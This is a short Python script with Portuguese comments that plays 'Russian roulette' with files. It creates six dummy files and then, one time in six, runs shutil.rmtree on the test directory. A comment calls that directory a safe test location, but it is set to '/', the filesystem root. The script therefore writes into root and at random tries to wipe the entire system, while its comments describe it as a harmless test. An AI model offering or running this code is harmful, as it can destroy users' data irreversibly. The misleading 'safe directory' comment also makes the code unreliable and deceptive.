import random
import os
import shutil

# Diretório seguro para testes
test_directory = "/"

# Garante que o diretório de teste exista
if not os.path.exists(test_directory):
    os.makedirs(test_directory)

# Criando arquivos fictícios para teste
for i in range(1, 7):
    with open(f"{test_directory}/arquivo_{i}.txt", "w") as f:
        f.write("Este é um arquivo de teste.\n")

print(f"Arquivos criados em {test_directory}")

# Roleta russa: 1 em 6 chances de deletar tudo no diretório de teste
if random.randint(1, 6) == 1:
    print("Você perdeu na roleta russa! Apagando todos os arquivos no diretório de teste...")
    shutil.rmtree(test_directory)  # Remove o diretório e todo o seu conteúdo
else:
    print("Você teve sorte desta vez! Nenhum arquivo foi apagado.")
